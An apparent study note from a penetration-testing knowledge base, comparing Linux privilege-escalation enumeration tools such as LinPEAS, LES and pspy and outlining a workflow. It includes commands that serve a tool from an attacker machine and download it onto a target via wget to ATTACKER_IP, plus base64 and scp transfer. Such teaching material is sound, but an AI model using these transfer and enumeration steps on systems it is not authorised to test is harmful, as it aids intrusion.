---
title: "Automated Enumeration Tools"
created: 2026-11-16
type: tool
tags: [enumeration, linux, privesc, tool]
---

Automated tools speed up Phase 2 enumeration but don't replace understanding. They surface findings — you interpret them, spot false positives, and fill gaps manually. No single tool catches everything, so know several.

---

## Tool Comparison

| Tool | Language | What It Does | Best For |
|------|----------|-------------|----------|
| **LinPEAS** | Bash/Python | Comprehensive enumeration with color-coded output — misconfigs, weak permissions, credentials, CVEs | First tool to run; broadest coverage |
| **LinEnum** | Bash | Dumps system info, users, cron, SUID binaries in a readable report | Lightweight alternative when LinPEAS is too noisy |
| **LES** (Linux Exploit Suggester) | Bash | Matches kernel version against known CVEs, suggests applicable exploits | Finding kernel/software exploits after identifying versions |
| **Linux Smart Enumeration** | Bash | Adjustable verbosity levels (0-2) — starts quiet, reveals more detail as level increases | Quick triage at level 0, deep dive at level 2 |
| **Linux Priv Checker** | Python | Enumerates system info and flags common privesc opportunities inline | When Python is available and you want inline annotations |
| **pspy** | Go (binary) | Event-driven process monitoring via inotify — catches short-lived root processes | Finding hidden cron jobs and background scripts that static tools miss |

---

## Getting Tools on Target

The target environment dictates what you can use. No Python? Skip Python-based tools. No wget? Try curl or base64 transfer.

**HTTP server method (most common):**

```bash
# Attacker: serve the tool
python3 -m http.server 8000

# Target: download
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
```

**SCP (if you have SSH creds):**

```bash
scp linpeas.sh user@TARGET:/tmp/
```

**Base64 (when no transfer tools available):**

```bash
# Attacker: encode
base64 linpeas.sh > linpeas.b64

# Target: paste and decode
echo "<base64_content>" | base64 -d > linpeas.sh
```

---

## LinPEAS

The most comprehensive tool. Color codes findings by severity:

- **Red/Yellow** — high-confidence privesc vectors
- **Green** — interesting but needs manual verification

```bash
./linpeas.sh | tee /tmp/linpeas_output.txt
```

Pipe to `tee` so you can review output later. Also checks for known CVEs in installed software — not just misconfigurations.

---

## Linux Exploit Suggester (LES)

Focuses specifically on software vulnerabilities rather than misconfigurations:

```bash
./linux-exploit-suggester.sh
```

Output lists CVEs with:
- **Exposure** — how likely the exploit works on this specific system
- **Tags** — which distro/kernel versions are confirmed vulnerable
- **Download URL** — link to the public exploit code

Always read the exploit code before running it. Check requirements (needs gcc? specific kernel config?), understand what it does, and verify it matches your target.

---

## Workflow

1. **Run LinPEAS first** — broadest coverage, highlights the obvious vectors
2. **Run LES** — catches kernel/software CVEs that LinPEAS might flag differently
3. **Run pspy** — reveals hidden scheduled tasks and background processes
4. **Manual verification** — confirm findings, check permissions, test exploitability

Don't rely on a single tool. Each has blind spots — LinPEAS might miss a custom cron wrapper, LES won't find misconfigurations, and pspy only sees what runs during your observation window.

---

## Related Notes

- [[Basic Enumeration]] — manual enumeration commands
- [[Process Snooping]] — pspy and process monitoring in depth
- [[Methodology]] — where automated tools fit in the privesc workflow
